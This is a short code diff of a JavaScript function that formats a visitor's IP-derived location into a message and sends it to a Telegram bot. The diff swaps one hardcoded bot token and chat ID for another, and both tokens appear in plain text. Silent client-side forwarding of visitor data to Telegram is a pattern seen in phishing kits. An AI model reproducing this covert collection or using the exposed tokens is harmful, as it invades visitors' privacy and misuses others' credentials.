@@ -246,8 +246,8 @@ function showPrompt(IpAddress) {
       "%0A<strong>City : </strong>" +
       IpAddress.city;
 
-    const botToken = "7499417462:AAEwpqvTLooxAENpFm7EsQEoGXwmd6G4MC8"; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-    const chatId = "#-2299618966"; // Thay YOUR_CHAT_ID bằng chat_id của bạn
+      const botToken = "7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44";
+      const chatId = "-1002299618966";
     const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
